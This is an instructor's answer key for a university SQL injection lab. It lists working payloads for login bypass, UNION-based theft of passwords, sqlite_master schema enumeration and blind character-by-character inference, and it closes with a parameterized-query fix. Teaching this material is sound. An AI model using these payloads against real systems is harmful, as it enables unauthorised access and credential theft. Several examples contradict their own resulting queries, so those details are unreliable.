# CYSE 411 – SQL Injection Exploitation Lab  
## Instructor Solution – Exercise 4

This document provides the **reference solutions and explanations** for the SQL Injection lab.

The goal of the lab is to demonstrate how **unsanitized input combined with string concatenation allows attackers to manipulate SQL queries executed by the database engine**.

The vulnerable application builds queries in the following form:

```sql
SELECT * FROM users
WHERE username = '<username>'
AND password = '<password>'
```

Because user input is inserted directly into the query, an attacker can inject SQL code.

---

# Question 1 – Authentication Bypass

## Example Payload

Password field:

```
' OR 1=1 --
```

Example login attempt:

```
Username: admin
Password: ' OR 1=1 --
```

---

## Resulting SQL Query

```sql
SELECT * FROM users
WHERE username = 'admin'
AND password = '' OR 1=1 --'
```

---

## Why This Works

The injected payload performs three actions:

1. `'` closes the password string literal.
2. `OR 1=1` inserts a Boolean expression that always evaluates to TRUE.
3. `--` comments out the remainder of the query.

The database effectively evaluates:

```sql
WHERE username='admin' AND password='' OR TRUE
```

Since the condition `TRUE` exists, the query returns rows, causing the login check to succeed.

The application code checks:

```
if(rows.length > 0)
```

Therefore authentication is bypassed.

---

## Alternative Payloads

### Classic Injection

```
' OR '1'='1' --
```

### Injection in Username Field

```
admin' --
```

This produces:

```sql
SELECT * FROM users
WHERE username = 'admin' --'
AND password = 'anything'
```

The password condition is ignored.

---

# Question 2 – Comment Injection

## Example Payload

Password field:

```
' --
```

Login attempt:

```
Username: admin
Password: ' --
```

---

## Resulting SQL Query

```sql
SELECT * FROM users
WHERE username = 'admin'
AND password = '' --'
```

---

## Why This Works

The payload terminates the password string and introduces a SQL comment.

SQL comments begin with:

```
--
```

Everything after the comment is ignored by the database engine.

The query effectively becomes:

```sql
SELECT * FROM users
WHERE username = 'admin'
AND password = ''
```

If the username exists, the authentication condition may still return rows depending on implementation logic.

A more effective variation is injecting the comment in the username field.

---

## Alternative Payload

Username field:

```
admin' --
```

Which produces:

```sql
SELECT * FROM users
WHERE username = 'admin' --'
AND password = 'anything'
```

This removes the password condition entirely.

---

# Question 3 – Extract Hidden Data Using UNION

## Example Payload

```
' UNION SELECT id,username,password FROM users --
```

Injected in the password field.

---

## Resulting SQL Query

```sql
SELECT * FROM users
WHERE username = 'admin'
AND password = ''
UNION
SELECT username,password FROM users --'
```

---

## Why This Works

The SQL `UNION` operator combines the results of two SELECT statements.

The attacker injects a second query that retrieves data from the `users` table.

As a result, the database returns:

```
admin | admin123
alice | password1
bob | password2
```

Even though the attacker does not have direct access to the database.

---

## Alternative Payloads

```
' UNION SELECT id,username,password FROM users --
```

Depending on column compatibility.

---

# Question 4 – Retrieve Additional Columns

UNION requires that both SELECT statements return the **same number of columns**.

The original query:

```sql
SELECT * FROM users
```

returns three columns:

```
id
username
password
```

Therefore the attacker must construct a UNION query with **three columns**.

---

## Example Payload

```
' UNION SELECT * FROM users --
```

---

## Resulting Query

```sql
SELECT * FROM users
WHERE username='admin'
AND password=''
UNION
SELECT id,username,password FROM users --'
```

---

## Why This Works

SQL requires UNION queries to have:

- the same number of columns
- compatible data types

If the number of columns differs, the database throws an error.

Attackers often determine the correct number of columns by testing payloads such as:

```
ORDER BY 1
ORDER BY 2
ORDER BY 3
```

until an error occurs.

---

# Question 5 – Enumerating the Database

SQLite stores metadata about database objects in a table called:

```
sqlite_master
```

Attackers can query this table to discover database structure.

---

## Example Payload

```
' UNION SELECT name,sql,NULL FROM sqlite_master --
```

---

## Resulting Query

```sql
SELECT * FROM users
WHERE username='admin'
AND password=''
UNION
SELECT name,sql,NULL FROM sqlite_master --'
```

---

## Why This Works

The `sqlite_master` table contains:

- table names
- schema definitions
- index information

This allows attackers to discover:

```
users
items
```

and their structure.

---

# Question 6 – Extract Item Data

The attacker may extract item information directly from the `items` table.

---

## Example Payload

```
' UNION SELECT id,name,price FROM items --
```

---

## Resulting Query

```sql
SELECT * FROM users
WHERE username='admin'
AND password=''
UNION
SELECT id,name,price FROM items --'
```

---

## Result

The attacker receives:

```
Laptop 1200
Phone 700
Headphones 200
Keyboard 150
```

This demonstrates how SQL injection can expose **data from unrelated tables**.

---

# Question 7 – Blind Injection (Conceptual)

Blind SQL injection occurs when attackers cannot directly see query results but can observe differences in application behavior.

Example attack:

```
' OR SUBSTR(password,1,1)='a' --
```

Injected during login.

---

## Explanation

The SQL function:

```
SUBSTR(password,1,1)
```

extracts the first character of the password.

The injected condition becomes:

```sql
' OR (username='admin' AND SUBSTR(password,1,1)='c') --
```

If the condition is TRUE, the query returns rows.

If FALSE, it does not.

By repeating the test with different characters, attackers can **infer the password character by character**.

---

# Reflection Questions – Suggested Answers

## 1. Why does string concatenation create vulnerabilities?

String concatenation mixes **code and data**.

User input becomes part of the SQL command executed by the database interpreter.

This allows attackers to inject additional SQL instructions.

---

## 2. What is the difference between data and instructions?

Data should represent **values** used in queries.

Instructions are **SQL commands executed by the database**.

Injection vulnerabilities occur when user data is interpreted as SQL instructions.

---

## 3. How do parameterized queries prevent injection?

Parameterized queries separate SQL structure from input values.

Example:

```javascript
db.get(
"SELECT * FROM users WHERE username=? AND password=?",
[username,password]
)
```

The database treats input strictly as data, preventing it from modifying the query structure.

---

## 4. Other interpreters vulnerable to injection

Many interpreters can suffer injection vulnerabilities:

- SQL (SQL Injection)
- OS commands (Command Injection)
- LDAP queries
- XPath queries
- template engines
- NoSQL queries
- shell interpreters
- scripting languages

---

# Optional Challenge – Solution

Replace string concatenation with parameterized queries.

Example secure version:

```javascript
db.get(
"SELECT * FROM users WHERE username = ? AND password = ?",
[username,password],
function(err,row){
    if(row){
        res.send("Login success")
    } else {
        res.send("Login failed")
    }
})
```

---

## Why This Prevents Injection

Parameterized queries send SQL instructions and user input separately.

The database engine ensures that user input **cannot alter the structure of the SQL statement**, eliminating SQL injection.

---